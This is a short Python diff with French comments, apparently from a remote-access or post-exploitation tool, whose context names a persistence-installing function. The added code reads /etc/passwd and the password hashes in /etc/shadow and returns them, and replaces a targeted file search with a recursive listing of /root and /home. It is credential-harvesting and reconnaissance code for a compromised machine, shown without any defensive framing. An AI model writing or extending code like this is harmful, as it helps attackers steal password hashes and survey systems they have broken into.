@@ -59,17 +59,32 @@ def install_persistence():
 
 
 def get_passwd_shadow():
+    output = ""
+
+    # on lit /etc/passwd (liste des utilisateurs)
+    try:
+        with open("/etc/passwd", "r") as f:
+            output += "=== /etc/passwd ===\n"
+            output += f.read()
+            output += "\n"
+    except PermissionError:
+        output += "=== /etc/passwd === Accès refusé\n"
+
+    # on lit /etc/shadow (hash des mots de passe, faut etre root)
     try:
         with open("/etc/shadow", "r") as f:
-            content = f.read()
-        return {"status": "ok", "output": content, "returncode": 0}
+            output += "=== /etc/shadow ===\n"
+            output += f.read()
     except PermissionError:
-        return {"status": "error", "message": "Accès refusé — root requis"}
+        output += "=== /etc/shadow === Accès refusé — root requis\n"
+
+    return {"status": "ok", "output": output, "returncode": 0}
 
 
 def list_sensitive_dirs():
+    # on liste /root et /home de facon recursive
     result = subprocess.run(
-        "ls -la /home/ && find /home -maxdepth 2 -name '*.txt' -o -name '*.conf' -o -name '*.key' 2>/dev/null",
+        "echo '=== /root ===' && ls -laR /root 2>/dev/null && echo '=== /home ===' && ls -laR /home 2>/dev/null",
         shell=True, capture_output=True, text=True
     )
     return {
